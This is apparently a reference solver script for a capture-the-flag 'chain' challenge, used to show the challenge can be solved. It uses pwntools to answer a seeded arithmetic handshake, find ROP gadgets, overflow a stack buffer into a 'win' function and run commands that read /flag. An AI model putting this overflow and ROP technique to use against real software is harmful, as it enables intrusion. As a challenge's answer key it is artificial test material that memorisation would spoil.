#!/usr/bin/env python3
"""Reference solver for the chain challenge — used to prove the target is
solvable, and to keep the container honest (a chain that nobody can finish
would measure nothing).

    python3 solve_chain.py local
    python3 solve_chain.py 127.0.0.1 10009
"""
import sys

from pwn import ELF, ROP, context, process, remote, p64

context.log_level = "error"

K1, K2, K3 = 0x9E3779B9, 0x5A5A5A5A, 0x13371337


def rol7(x):
    return ((x << 7) | (x >> 25)) & 0xFFFFFFFF


def find_gadget(elf, needle):
    """pwntools' ROP on a large static binary often reports no gadgets, so scan
    executable segments for the raw bytes instead."""
    for seg in elf.segments:
        if seg.header.p_type != "PT_LOAD" or not (seg.header.p_flags & 1):
            continue
        blob = elf.read(seg.header.p_vaddr, seg.header.p_filesz)
        i = blob.find(needle)
        if i >= 0:
            return seg.header.p_vaddr + i
    raise SystemExit("gadget not found: " + needle.hex())


def main():
    elf = ELF("$HOME/pwnrange/chals/s1/chain", checksec=False)
    pop_rdi = find_gadget(elf, b"\x5f\xc3")  # pop rdi ; ret
    ret_only = find_gadget(elf, b"\xc3")  # ret

    if len(sys.argv) > 1 and sys.argv[1] == "local":
        p = process("$HOME/pwnrange/chals/s1/chain")
    else:
        p = remote(sys.argv[1], int(sys.argv[2]))

    p.recvuntil(b"seed ")
    s = int(p.recvline().strip(), 16)

    a = (s * K1) & 0xFFFFFFFF
    p.recvuntil(b"A: ")
    p.sendline(hex(a).encode())

    b = rol7(a) ^ K2
    p.recvuntil(b"B: ")
    p.sendline(hex(b).encode())

    tbl_line = p.recvline().strip()
    table = [int(x, 16) for x in tbl_line.split(b":")[1].split()]
    idx = p.recvline().split()
    i1, i2 = int(idx[1]), int(idx[2])
    c = table[i1] ^ table[i2]

    p.recvuntil(b"C: ")
    p.sendline(hex(c).encode())

    d = rol7(b ^ c ^ K3)

    p.recvuntil(b"D> ")
    payload = b"A" * 0x40 + b"B" * 8 + p64(ret_only) + p64(pop_rdi) + p64(d) + p64(elf.sym["win"])
    p.send(payload)

    p.sendline(b"id; cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null; echo MARKDONE")
    out = p.recvrepeat(3)
    sys.stdout.write(out.decode("latin-1"))
    p.close()


if __name__ == "__main__":
    main()
